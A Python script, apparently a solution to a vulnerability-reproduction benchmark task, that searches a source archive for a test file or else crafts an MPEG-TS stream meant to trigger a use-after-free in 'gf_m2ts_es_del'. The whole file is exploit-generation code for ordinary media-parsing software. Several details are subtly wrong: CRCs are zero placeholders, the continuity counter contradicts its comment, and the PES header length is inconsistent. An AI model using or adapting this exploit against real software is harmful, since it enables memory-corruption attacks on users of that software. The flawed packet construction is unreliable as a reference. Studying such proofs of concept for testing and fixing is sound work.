import os
import tempfile
import subprocess
import struct
from pathlib import Path

class Solution:
    def solve(self, src_path: str) -> bytes:
        # First, try to find existing test case in the source
        poc = self._find_existing_poc(src_path)
        if poc:
            return poc
        
        # If not found, generate our own minimal PoC
        # Based on typical MPEG-TS structure with PAT and PMT
        # Target is to trigger use-after-free in gf_m2ts_es_del
        
        # MPEG-TS packet size is 188 bytes
        # We need to create packets that will cause ES deletion and then reuse
        
        poc_bytes = bytearray()
        
        # Create PAT (Program Association Table) - PID 0
        pat = self._create_pat()
        poc_bytes.extend(self._create_ts_packet(0, pat))
        
        # Create PMT (Program Map Table) - PID 16
        pmt = self._create_pmt()
        poc_bytes.extend(self._create_ts_packet(16, pmt))
        
        # Create PES packet for video ES - PID 32
        pes = self._create_pes()
        poc_bytes.extend(self._create_ts_packet(32, pes))
        
        # Create another PAT to trigger reconfiguration
        pat2 = self._create_pat2()
        poc_bytes.extend(self._create_ts_packet(0, pat2))
        
        # Create PMT without the ES to trigger deletion
        pmt2 = self._create_pmt2()
        poc_bytes.extend(self._create_ts_packet(16, pmt2))
        
        # Create packet with same PID to trigger use-after-free
        poc_bytes.extend(self._create_ts_packet(32, b'\x00' * 184))
        
        # Pad to match required length (1128 bytes = 6 packets)
        while len(poc_bytes) < 1128:
            poc_bytes.extend(self._create_ts_packet(8191, b'\x00' * 184))
        
        return bytes(poc_bytes[:1128])
    
    def _find_existing_poc(self, src_path: str) -> bytes:
        """Try to find existing test case in source tree"""
        try:
            import tarfile
            with tarfile.open(src_path, 'r:*') as tar:
                # Look for test files
                for member in tar.getmembers():
                    if member.name.endswith(('.ts', '.m2ts', '.bin')) and member.size > 0:
                        f = tar.extractfile(member)
                        if f:
                            data = f.read()
                            if 1000 <= len(data) <= 1200:
                                return data[:1128]
        except:
            pass
        return None
    
    def _create_ts_packet(self, pid: int, payload: bytes) -> bytes:
        """Create MPEG-TS packet with given PID and payload"""
        packet = bytearray(188)
        
        # Sync byte
        packet[0] = 0x47
        
        # PID (13 bits)
        packet[1] = (pid >> 8) & 0x1F
        packet[2] = pid & 0xFF
        
        # Adaptation field control: payload only, no adaptation
        packet[3] = 0x10  # payload_unit_start_indicator = 0
        
        # Continuity counter (will be set later)
        packet[3] |= 0x0F  # Keep continuity counter at 0
        
        # Copy payload
        payload_len = min(len(payload), 184)
        packet[4:4+payload_len] = payload[:payload_len]
        
        return bytes(packet)
    
    def _create_pat(self) -> bytes:
        """Create Program Association Table"""
        # PAT header
        data = bytearray()
        data.append(0x00)  # table_id
        data.append(0xB0)  # section_syntax_indicator = 1, section_length upper bits
        data.append(0x0D)  # section_length lower bits (13 bytes total)
        data.append(0x00)  # transport_stream_id high
        data.append(0x01)  # transport_stream_id low
        data.append(0xC1)  # version=0, current_next=1
        data.append(0x00)  # section_number
        data.append(0x00)  # last_section_number
        
        # Program 1 -> PMT PID 16
        data.append(0x00)  # program_number high
        data.append(0x01)  # program_number low
        data.append(0xE0)  # reserved + PMT PID high (0x10 >> 8)
        data.append(0x10)  # PMT PID low
        
        # CRC32 placeholder
        data.extend(b'\x00\x00\x00\x00')
        
        # Pad to 184 bytes
        data.extend(b'\xFF' * (184 - len(data)))
        return bytes(data)
    
    def _create_pat2(self) -> bytes:
        """Create second PAT with different program"""
        data = bytearray()
        data.append(0x00)  # table_id
        data.append(0xB0)  # section_syntax_indicator = 1
        data.append(0x0D)  # section_length
        data.append(0x00)  # transport_stream_id high
        data.append(0x02)  # transport_stream_id low
        data.append(0xC1)  # version=0, current_next=1
        data.append(0x00)  # section_number
        data.append(0x00)  # last_section_number
        
        # Program 2 -> PMT PID 16 (same PMT PID)
        data.append(0x00)  # program_number high
        data.append(0x02)  # program_number low
        data.append(0xE0)  # reserved + PMT PID high
        data.append(0x10)  # PMT PID low
        
        # CRC32 placeholder
        data.extend(b'\x00\x00\x00\x00')
        
        # Pad to 184 bytes
        data.extend(b'\xFF' * (184 - len(data)))
        return bytes(data)
    
    def _create_pmt(self) -> bytes:
        """Create Program Map Table with one ES"""
        data = bytearray()
        data.append(0x02)  # table_id (PMT)
        data.append(0xB0)  # section_syntax_indicator = 1
        data.append(0x17)  # section_length (23 bytes)
        data.append(0x00)  # program_number high
        data.append(0x01)  # program_number low
        data.append(0xC1)  # version=0, current_next=1
        data.append(0x00)  # section_number
        data.append(0x00)  # last_section_number
        data.append(0xE0)  # reserved + PCR PID high
        data.append(0x00)  # PCR PID low (no PCR)
        data.append(0xF0)  # reserved + program_info_length high
        data.append(0x00)  # program_info_length low (no descriptors)
        
        # Video ES (PID 32, H.264)
        data.append(0x1B)  # stream_type (H.264 video)
        data.append(0xE0)  # reserved + elementary PID high (0x20 >> 8)
        data.append(0x20)  # elementary PID low (32)
        data.append(0xF0)  # reserved + ES_info_length high
        data.append(0x00)  # ES_info_length low (no descriptors)
        
        # CRC32 placeholder
        data.extend(b'\x00\x00\x00\x00')
        
        # Pad to 184 bytes
        data.extend(b'\xFF' * (184 - len(data)))
        return bytes(data)
    
    def _create_pmt2(self) -> bytes:
        """Create second PMT without the ES"""
        data = bytearray()
        data.append(0x02)  # table_id (PMT)
        data.append(0xB0)  # section_syntax_indicator = 1
        data.append(0x0F)  # section_length (15 bytes)
        data.append(0x00)  # program_number high
        data.append(0x02)  # program_number low
        data.append(0xC1)  # version=0, current_next=1
        data.append(0x00)  # section_number
        data.append(0x00)  # last_section_number
        data.append(0xE0)  # reserved + PCR PID high
        data.append(0x00)  # PCR PID low (no PCR)
        data.append(0xF0)  # reserved + program_info_length high
        data.append(0x00)  # program_info_length low (no descriptors)
        
        # No ES entries
        
        # CRC32 placeholder
        data.extend(b'\x00\x00\x00\x00')
        
        # Pad to 184 bytes
        data.extend(b'\xFF' * (184 - len(data)))
        return bytes(data)
    
    def _create_pes(self) -> bytes:
        """Create PES packet"""
        data = bytearray()
        
        # PES header
        data.extend(b'\x00\x00\x01')  # start code prefix
        data.append(0xE0)  # stream_id (video)
        data.append(0x00)  # PES_packet_length high (0 = unbounded)
        data.append(0x00)  # PES_packet_length low
        data.append(0x80)  # marker bits + scrambling + priority + alignment
        data.append(0xC0)  # copyright + original + PTS/DTS flags
        data.append(0x0A)  # PES_header_data_length
        
        # PTS (33 bits)
        data.append(0x21)  # 0010 + PTS[32:30]
        data.append(0x00)  # PTS[29:22]
        data.append(0x01)  # PTS[21:15]
        data.append(0x00)  # PTS[14:7]
        data.append(0x01)  # PTS[6:0]
        
        # Some payload data
        data.extend(b'\x00' * 100)
        
        # Pad to 184 bytes
        data.extend(b'\x00' * (184 - len(data)))
        return bytes(data)